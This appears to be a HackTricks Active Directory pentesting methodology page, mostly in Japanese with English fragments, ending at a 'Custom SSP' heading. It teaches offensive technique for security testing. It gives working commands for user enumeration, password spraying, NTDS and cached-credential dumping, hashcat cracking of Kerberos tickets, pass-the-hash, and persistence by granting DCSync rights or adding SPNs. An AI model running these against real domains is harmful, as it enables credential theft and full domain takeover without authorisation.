# Active Directory の方法論

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は、ネットワーク内で **ドメイン**、**ユーザー**、および **オブジェクト** を効率的に作成・管理できる基盤技術です。大規模にスケールするよう設計されており、多数のユーザーを管理可能な **グループ** や **サブグループ** に整理し、さまざまなレベルでの **アクセス権** を制御できます。

**Active Directory** の構造は主に 3 つの層から構成されます: **domains**、**trees**、および **forests**。**domain** は共通のデータベースを共有する **ユーザー** や **デバイス** などのオブジェクトの集合を含みます。**trees** は共通構造で結ばれたこれらのドメインのグループであり、**forest** は複数の trees をまとめ、**trust relationships** によって相互接続された最上位の組織構造を表します。各レベルで特定の **アクセス** や **通信権限** を指定できます。

**Active Directory** の主要な概念は次のとおりです:

1. **Directory** – Active Directory オブジェクトに関するすべての情報を格納します。
2. **Object** – ディレクトリ内のエンティティを示し、**ユーザー**、**グループ**、または **共有フォルダ** などが含まれます。
3. **Domain** – ディレクトリオブジェクトのコンテナとして機能し、複数のドメインが **forest** 内で共存でき、それぞれが独自のオブジェクトコレクションを保持します。
4. **Tree** – 共通のルートドメインを共有するドメインのグループです。
5. **Forest** – Active Directory における組織構造の頂点で、複数の trees とそれらの間の **trust relationships** から構成されます。

**Active Directory Domain Services (AD DS)** は、ネットワーク内での集中管理と通信に不可欠な一連のサービスを包含します。これらのサービスには次が含まれます:

1. **Domain Services** – データ格納を中央集権化し、**ユーザー**と**ドメイン**間の相互作用（**認証**や検索機能など）を管理します。
2. **Certificate Services** – 安全な **デジタル証明書** の作成、配布、管理を監督します。
3. **Lightweight Directory Services** – **LDAP protocol** を通じてディレクトリ対応アプリケーションをサポートします。
4. **Directory Federation Services** – 複数の Web アプリケーションに対して **single-sign-on** を提供します。
5. **Rights Management** – 著作物の不正な配布や利用を制御することで保護を支援します。
6. **DNS Service** – **domain names** の解決に不可欠です。

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## チートシート

クイックに AD の列挙／悪用で使えるコマンドを確認したい場合は、[https://wadcoms.github.io/](https://wadcoms.github.io) を参照してください。

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory（資格情報／セッションなし）

AD 環境にアクセスできるが資格情報やセッションがない場合、次のことが可能です:

- **Pentest the network:**
- ネットワークをスキャンし、マシンと開いているポートを見つけ、**脆弱性を悪用**したり、そこから **資格情報を抽出** したりします（例えば、[printers could be very interesting targets](ad-information-in-printers.md)）。
- DNS を列挙することで、ドメイン内の重要なサーバ（web、printers、shares、vpn、media など）に関する情報が得られることがあります。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 詳しくは一般的な [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) を参照して、この作業の方法を確認してください。
- **Check for null and Guest access on smb services**（これは最新の Windows バージョンでは機能しないことがあります）:
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB サーバを列挙する方法の詳細ガイドは次を参照してください:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP の列挙方法の詳細ガイドは次を参照してください（**匿名アクセス**に特に注意）:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder を用いてサービスを偽装し資格情報を収集する（**impersonating services with Responder**）: ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
- リレー攻撃を悪用してホストにアクセスする（**abusing the relay attack**）: ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack
- 悪意のある UPnP サービス（evil-S）や SDP を露出して資格情報を収集する（**exposing fake UPnP services with evil-S**）: ../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.mdおよび[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- ドメイン環境内および公開されている情報源から、内部ドキュメント、ソーシャルメディア、サービス（主に web）などを調査してユーザー名や氏名を抽出します。
- 会社の従業員のフルネームが分かれば、さまざまな AD **username conventions** を試すことができます（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。一般的な命名規則には次のものがあります: _NameSurname_, _Name.Surname_, _NamSur_（各 3 文字づつ）、_Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 つの _random letters と 3 つの random numbers_（abc123）。
- ツール:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### ユーザー列挙

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) と [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) のページを確認してください。
- **Kerbrute enum**: 無効なユーザー名をリクエストすると、サーバは **Kerberos エラー** コード _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ を返し、ユーザー名が無効であることを判別できます。**有効なユーザー名** は AS-REP の TGT を返すか、事前認証が必要であることを示すエラー _KRB5KDC_ERR_PREAUTH_REQUIRED_ を返します。
- **No Authentication against MS-NRPC**: ドメインコントローラ上の MS-NRPC (Netlogon) インターフェースに対して auth-level = 1（認証なし）を使用します。この方法は MS-NRPC インターフェースにバインドした後、`DsrGetDcNameEx2` 関数を呼び出して、資格情報なしでユーザーやコンピュータが存在するかどうかを確認します。NauthNRPC (https://github.com/sud0Ru/NauthNRPC) ツールはこの種の列挙を実装しています。研究は次にあります: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

ネットワーク内でこれらのサーバーのいずれかを見つけた場合、**user enumeration against it** を行うこともできます。例えば、[**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> ユーザー名の一覧は [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) およびこちらのリポジトリ ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) で見つけられます。
>
> ただし、事前に実施しているはずの recon step から得た、会社で働いている人々の名前を持っているべきです。名前と姓が分かっていれば、スクリプト [**namemash.py**](https://gist.github.com/superkojiman/11076951) を使って潜在的な有効ユーザー名を生成できます。

### Knowing one or several usernames

では、既に有効なユーザー名は分かっているがパスワードが無い場合…次を試してください:

- [**ASREPRoast**](asreproast.md): ユーザーが属性 _DONT_REQ_PREAUTH_ を持っていない場合、そのユーザーの AS_REP メッセージを要求でき、その中にはユーザーのパスワードから派生した鍵で暗号化されたデータが含まれます。
- [**Password Spraying**](password-spraying.md): 発見した各ユーザーに対して最も一般的なパスワードを試してみてください。悪いパスワードを使っているユーザーがいるかもしれません（パスワードポリシーを忘れずに！）。
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

ネットワーク上のいくつかのプロトコルを poisoning することで、クラック可能なチャレンジハッシュを取得できる可能性があります：

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory の列挙に成功すると、より多くのメールアドレスやネットワークの理解が得られます。NTLM の [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) を強制して AD 環境へアクセスできることがあります。

### Steal NTLM Creds

null や guest ユーザーで他の PC や共有にアクセスできる場合、SCF ファイルのようなファイルを配置しておき、それが何らかの形でアクセスされると t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** は、既に保有している各 NT ハッシュを、NT ハッシュから直接派生する鍵素材を持つ遅いフォーマット（Kerberos RC4 チケット、NetNTLM チャレンジ、キャッシュされた資格情報など）に対する候補パスワードとして扱います。長いパスフレーズを Kerberos RC4 チケットや NetNTLM 応答、キャッシュされた資格情報でブルートフォースする代わりに、NT ハッシュを Hashcat の NT-candidate モードに投入して、平文を学習することなくパスワードの再利用を検証します。これは、ドメイン侵害後に数千の現在および過去の NT ハッシュを収集できる場合に特に強力です。

shucking を使うべき状況:

- DCSync、SAM/SECURITY ダンプ、または資格情報ボールトから得た NT コーパスがあり、他の（遅い）フォーマットでの再利用をテストする必要がある場合。
- RC4 ベースの Kerberos マテリアル（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM 応答、または DCC/DCC2 ブロブをキャプチャした場合。
- 長く解読困難なパスフレーズの再利用を素早く証明し、すぐに Pass-the-Hash でピボットしたい場合。

この手法は、鍵が NT ハッシュではない暗号タイプ（例: Kerberos etype 17/18 AES）には効きません。ドメインが AES のみを強制している場合は、通常のパスワードモードに戻る必要があります。

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

履歴エントリは候補プールを劇的に広げます。Microsoft はアカウントごとに最大 24 個の過去ハッシュを保存できるためです。NTDS シークレットを収集するその他の方法については次を参照してください:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) はローカル SAM/SECURITY データおよびキャッシュされたドメインログオン (DCC/DCC2) を抽出します。重複を排除してこれらのハッシュを同じ `nt_candidates.txt` リストに追加してください。
- **Track metadata** – ハッシュを生成した username/domain を（ワードリストが hex のみであっても）記録しておいてください。Hashcat が勝利候補を表示したら、どのプリンシパルがパスワードを再利用しているかを即座に特定できます。
- 同一フォレストまたは信頼されたフォレストからの候補を優先してください。shucking 時の重複確率が最大化されます。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat は各 NT 候補から RC4 鍵を派生させ、`$krb5tgs$23$...` ブロブを検証します。マッチが確認されれば、そのサービスアカウントが既存の NT ハッシュのいずれかを使用していることを示します。

3. 直ちに PtH でピボットします:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

必要に応じて後で `hashcat -m 1000 <matched_hash> wordlists/` を使って平文を回復することもできます。

#### Example – Cached credentials (mode 31600)

1. 侵害したワークステーションからキャッシュされたログオンをダンプします:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 興味のあるドメインユーザーの DCC2 行を `dcc2_highpriv.txt` にコピーして shuck します:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. マッチが成功すれば、そのキャッシュユーザーが既にリスト内の NT ハッシュを再利用していることが証明されます。PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`）に直接使うか、オフラインで高速な NTLM モードに対してブルートフォースして文字列を回復してください。

同じワークフローは NetNTLM チャレンジ応答（`-m 27000/27100`）や DCC（`-m 31500`）にも適用されます。マッチが特定されれば、リレー攻撃、SMB/WMI/WinRM の PtH、またはオフラインでの NT ハッシュ再クラックを実行できます。



## Enumerating Active Directory WITH credentials/session

このフェーズでは、有効なドメインアカウントの資格情報またはセッションを既に侵害している必要があります。もし有効な資格情報やドメインユーザーとしてのシェルを持っているなら、前に挙げたオプションは他のユーザーを侵害するための手段として依然利用可能であることを覚えておいてください。

認証付きの列挙を開始する前に、**Kerberos double hop problem** を理解しておくべきです。

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

アカウントを侵害することは、ドメイン全体を侵害し始めるための大きな一歩です。これにより Active Directory 列挙を開始できます:

ASREPRoast に関しては、今や脆弱な可能性のある全てのユーザーを見つけられますし、Password Spraying に関しては全ユーザー名のリストを取得して、侵害したアカウントのパスワード、空パスワード、新たに有望なパスワードを試すことができます。

- [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) を使って基本的な情報収集を行えます。
- よりステルスな方法として [**powershell for recon**](../basic-powershell-for-pentesters/index.html) を使うこともできます。
- さらに詳細な情報を抽出するために [**use powerview**](../basic-powershell-for-pentesters/powerview.md) も利用できます。
- Active Directory のリコネにおける優れたツールに [**BloodHound**](bloodhound.md) があります。コレクション方法によっては**あまりステルスではありません**が、気にしないならぜひ試すべきです。ユーザーがどこで RDP できるか、他のグループへのパスを見つけるなどが可能です。
- **その他の自動化された AD 列挙ツール:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) には興味深い情報が含まれていることがあります。
- GUI ベースのツールとしては SysInternal Suite の **AdExplorer.exe** を使ってディレクトリを列挙できます。
- LDAP データベース内を **ldapsearch** で検索し、_userPassword_ や _unixUserPassword_ フィールド、あるいは _Description_ で資格情報を探すこともできます。その他の方法については PayloadsAllTheThings の [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) を参照してください。
- **Linux を使っている場合** は [**pywerview**](https://github.com/the-useless-one/pywerview) を使ってドメインを列挙することもできます。
- 自動化ツールの例:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **全ドメインユーザーの抽出**

Windows では全ドメインのユーザー名を取得するのは非常に簡単です（`net user /domain`、`Get-DomainUser`、`wmic useraccount get name,sid`）。Linux では `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` や `enum4linux -a -u "user" -p "password" <DC IP>` を使えます。

> この Enumeration セクションは短く見えるかもしれませんが、最も重要な部分です。リンク（主に cmd、powershell、powerview、BloodHound）にアクセスして、ドメインを列挙する方法を学び、自信が付くまで練習してください。評価時には、これが DA への道を見つけるか、または何もできないと判断する重要な瞬間になります。

### Kerberoast

Kerberoasting は、ユーザーアカウントに紐づくサービスが使用する **TGS tickets** を取得し、それらの暗号（ユーザーパスワードに基づく）をオフラインでクラックすることを含みます。

詳細は次を参照してください:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

いくつかの資格情報を取得したら、任意の **machine** へアクセスできるかを確認してください。そのために、ポートスキャンの結果に応じて複数のサーバへ異なるプロトコルで接続を試みるために **CrackMapExec** を使用できます。

### Local Privilege Escalation

通常のドメインユーザーとして資格情報またはセッションを侵害し、そのユーザーでドメイン内の任意のマシンへアクセスできる場合は、ローカルでの権限昇格と資格情報の収集を試みるべきです。ローカル管理者権限を得て初めて、他のユーザーのハッシュをメモリ（LSASS）やローカル（SAM）からダンプできます。

本書には [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) の完全なページと、[**checklist**](../checklist-windows-privilege-escalation.md) があります。また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) の使用も忘れないでください。

### Current Session Tickets

現在のユーザーのチケットが予期しないリソースへアクセスする権限を与えている可能性は非常に低いですが、確認することはできます:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **より多くのメールとネットワークの理解**。You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### コンピュータ共有でCredsを探す | SMB Shares

Now that you have some basic credentials you should check if you can **AD 内で共有されている興味深いファイルを見つける**。You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).

[**このリンクから使用できるツールについて学んでください。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **他の PCs または shares にアクセスできる** you could **ファイルを配置する** (like a SCF file) that if somehow accessed will **あなたに対して NTLM 認証をトリガーする** so you can **盗んで** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **ドメインコントローラを侵害する**。


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**ハッシュを取得するさまざまな方法についてはこのページを読んでください。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**詳細はこのページを参照してください。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **ユーザの NTLM hash を使って Kerberos チケットを要求する**ことを目的としており、一般的な NTLM 上の Pass The Hash の代替手段となります。したがって、NTLM プロトコルが無効化されており認証に Kerberos のみが許可されているネットワークで特に**有用**です。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **ユーザの認証チケットを盗む** instead of their password or hash values. This stolen ticket is then used to **ユーザを偽装（impersonate）し**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrato**r you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> これはかなりノイズが多いことに注意してください。また、LAPS があればこれを緩和できます。

### MSSQL Abuse & Trusted Links

ユーザーが **MSSQL instances にアクセスする権限** を持っている場合、MSSQL ホスト上で（SA として動作していれば）**コマンドを実行**したり、NetNTLM **hash** を**窃取**したり、さらには **relay** **attack** を実行できる可能性があります。\
また、ある MSSQL インスタンスが別の MSSQL インスタンスから **trusted（database link）** になっている場合、ユーザーが trusted database に対する権限を持っていれば、**信頼関係を利用して他のインスタンスでもクエリを実行できる**ようになります。これらの trust は連鎖することがあり、最終的にコマンドを実行できるように misconfigured なデータベースを見つけることがありえます。\
**データベース間のリンクは forest trusts を越えても機能します。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

サードパーティのインベントリやデプロイメントスイートは、しばしば資格情報やコード実行への強力な経路を露出します。参照：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

もし Computer オブジェクトの属性に [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) が設定されていて、かつそのコンピュータ上でドメインの権限を持っているなら、そのコンピュータにログインする全ユーザーのメモリから TGT をダンプできるようになります。\
つまり、**Domain Admin がそのコンピュータにログインすれば**、その TGT をダンプして [Pass the Ticket](pass-the-ticket.md) を使って本人になりすますことが可能です。\
constrained delegation を利用すれば **Print Server を自動的に乗っ取る**（運が良ければそれが DC である）ことさえできます。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

ユーザーやコンピュータが "Constrained Delegation" を許可されていると、そのコンピュータ上のいくつかのサービスに対して **任意のユーザーをなりすましてアクセス** できるようになります。\
そのユーザー/コンピュータの **hash を compromise** すれば、（domain admins を含む）**任意のユーザーをなりすまして** いくつかのサービスにアクセスできるようになります。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

リモートコンピュータの Active Directory オブジェクトに対して **WRITE 権限** を持つことは、**昇格した権限でのコード実行** を得る手段になります：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

侵害したユーザーがいくつかのドメインオブジェクトに対して **興味深い権限** を持っている場合、これにより後で横移動や権限の **escalate** が可能になることがあります。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

ドメイン内で **Spool service がリッスンしている** のを発見すると、これを **悪用**して **新しい資格情報を取得** したり **権限を昇格** したりできます。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**他のユーザー**が**侵害された**マシンに**アクセス**すると、そのメモリから資格情報を **収集** したり、彼らのプロセスに **beacons をインジェクト** してなりすますことが可能です。\
通常ユーザーは RDP を使ってシステムにアクセスするため、ここではサードパーティ RDP セッションに対するいくつかの攻撃手法を紹介します：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** はドメイン参加したコンピュータの **ローカル Administrator password** を管理するためのシステムで、パスワードを **ランダム化**、ユニーク化、かつ頻繁に **変更** します。これらのパスワードは Active Directory に保存され、アクセスは ACL によって許可されたユーザーのみに制御されます。これらのパスワードにアクセスする十分な権限があれば、他のコンピュータへ pivot することが可能になります。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

侵害したマシンから **certificates を収集** することは、環境内で権限を昇格する手段になり得ます：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**vulnerable templates** が設定されている場合、それらを悪用して権限を昇格することが可能です：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一度 **Domain Admin**、あるいはさらに **Enterprise Admin** の権限を得たら、ドメインデータベースである _ntds.dit_ を **ダンプ** できます。

[**DCSync attack に関する詳細はこちら**](dcsync.md)。

[**NTDS.dit を窃取する方法に関する詳細はこちら**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

前述したいくつかのテクニックは、永続化のためにも使用できます。\
例えば次のようなことが可能です：

- ユーザーを [**Kerberoast**](kerberoast.md) に対して脆弱にする

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- ユーザーを [**ASREPRoast**](asreproast.md) に対して脆弱にする

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- ユーザーに [**DCSync**](#dcsync) 権限を付与する

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** は、特定のサービス用に **正当な Ticket Granting Service (TGS) ticket** を **NTLM hash**（例えば PC account の hash）を使って作成する攻撃です。この方法はサービスの権限にアクセスするために使用されます。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** は、攻撃者が Active Directory 環境における **krbtgt アカウントの NTLM hash** にアクセスすることを伴います。このアカウントはすべての **TGTs** に署名するために使用される特別なアカウントです。

攻撃者がこの hash を得ると、任意のアカウントのために **TGTs** を作成できるようになります（Silver ticket attack のように）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

これは一般的な golden ticket 検出メカニズムを**回避する**ように偽造された golden ticket に似た物です。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

アカウントの **certificates を保有する、あるいはそれを要求できる** ことは、（ユーザーがパスワードを変更しても）そのユーザーアカウントに永続化する非常に有効な手段です：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates を使用してドメイン内で高い権限を持ったまま永続化する**ことも可能です：


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory の **AdminSDHolder** オブジェクトは、Domain Admins や Enterprise Admins のような **特権グループ** のセキュリティを確保するために、これらのグループに対して標準の **ACL** を適用して不正な変更を防ぎます。しかし、この機能は悪用される可能性があり、攻撃者が AdminSDHolder の ACL を変更して通常ユーザーにフルアクセスを与えると、そのユーザーはすべての特権グループに対する広範な制御を得ることになります。保護のための機能が逆に監視されていないと不正アクセスをもたらす可能性があります。

[**AdminDSHolder Group に関する詳細はこちら。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての **Domain Controller (DC)** には **ローカル administrator** アカウントが存在します。そのようなマシンで管理者権限を取得すれば、mimikatz を使ってローカル Administrator の hash を抽出できます。その後、レジストリの変更が必要になり、このパスワードの使用を **有効化** してローカル Administrator アカウントへリモートでアクセスできるようにします。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

将来の権限昇格を可能にするような、特定のドメインオブジェクトに対する **特別な権限** を **ユーザーに付与** することができます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** はオブジェクトが他のオブジェクトに対して持つ **permissions** を **保存** するために使用されます。オブジェクトの **security descriptor に少し変更を加えるだけで**、特権グループのメンバーでなくてもそのオブジェクトに対して非常に興味深い権限を得ることができます。


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

LSASS のメモリを改変して **ユニバーサルパスワード** を設定し、すべてのドメインアカウントへのアクセスを可能にします。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

